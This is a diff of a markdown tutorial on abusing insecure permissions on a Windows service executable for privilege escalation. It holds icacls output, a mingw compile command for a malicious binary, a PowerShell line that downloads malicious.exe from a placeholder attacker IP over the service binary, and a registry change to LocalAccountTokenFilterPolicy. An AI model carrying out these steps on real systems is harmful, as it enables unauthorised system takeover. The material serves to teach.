@@ -14,7 +14,7 @@ Here's a quick summary of Windows file permissions based on the provided table:
 
 ## Pratice
 
-### Insecure Permissions on Service Executable :
+### Insecure permissions on service executable 
 
 This type of abuse can occur when the binary of a Windows service is misconfigured, meaning that the permissions for this binary allow, for example, a local user without special privileges to modify it or even replace it with a malicious one, the Attacker can obtain the privileges of the service account in general a high privileges account.
 
@@ -39,12 +39,11 @@ AbuseFunction  : Install-ServiceBinary -ServiceName 'aniService'
 If you have identified your vulnerable binary with a tool like PowerUp or even Winpeas, you can check the permissions of this binary with **icacls.exe**. The most interesting permissions are (F) and (M) if they are related to a group such as `Everyone:` or a local user for exemple. 
 ```powershell
 > icacls "C:\Program Files\AniService\ani.exe"
-C:\Program Files\AniService\ani.exe AUTORITÉ DE PACKAGE D’APPLICATION\TOUS LES PACKAGES D’APPLICATION:(RX)
-                                    AUTORITÉ DE PACKAGE D’APPLICATION\TOUS LES PACKAGES D’APPLICATION RESTREINTS:(RX)
-                                    AUTORITE NT\Système:(F)
-                                    BUILTIN\Administrateurs:(F)
-                                    Tout le monde:(F)
-                                    BUILTIN\Utilisateurs:(RX)
+C:\Program Files\AniService\ani.exe
+                                    AUTORITE NT\System:(F)
+                                    BUILTIN\Administrators:(F)
+                                    Everyone:(F)
+                                    BUILTIN\Users:(RX)
 ```
 
 In the current practical case the executable permission (F) on the group "Everyone", but if the permission was set in (M) it would also have been possible to abuse. Thanks to this bad configuration the attacker can simply replace the binary with another malicious one. it is possible to use PowerUp for automated task.
@@ -64,15 +63,19 @@ int i;
 return 0;
 }
 
-# COMPILE THE CODE
-i686-w64-mingw32-gcc <CODE.c> -lws2_32 -o <FILE.exe>
 ```
+
+To compile Windows Executable it is possible to use `i686-w64-mingw32-gcc`.
+```bash
+> i686-w64-mingw32-gcc <CODE.c> -lws2_32 -o <FILE.exe>
+```
+
 Thanks to the wrong permission the attacker can replace the old executable by renominating it for example. Then it will be able to add the new malicious file with a name identical to the original one.
 ```powershell
 > move ani.exe ani.exe.bak
 
 # DOWNLOAD THE MALICIOUS EXECUTABLE
-> iwr http://<KALI_IP>/malicious.exe -Outfile "C:\Program Files\AniService\ani.exe"
+> iwr http://<ATTACKER_IP>/malicious.exe -Outfile "C:\Program Files\AniService\ani.exe"
 ```
 Once the binary is replaced you have to restart the service, to check if this is possible a tool of the suite sysinternal can help, [accesschk.exe](https://download.sysinternals.com/files/AccessChk.zip) is a tool that allows adminsys to quickly check what type of access users or specific groups have to resources, including files, directories, registry keys, global objects and Windows services.
 ```powershell
@@ -123,7 +126,7 @@ A small nuance when adding a local user: there is a registry key named **LocalAc
 > reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t Reg_DWORD /d 1
 ```
 
-#### Ressources :
+#### Ressources 
 [https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy](https://kb.cybertecsecurity.com/knowledge/localaccounttokenfilterpolicy)
 
 [https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/](https://offsec.blog/hidden-danger-how-to-identify-and-mitigate-insecure-windows-services/)
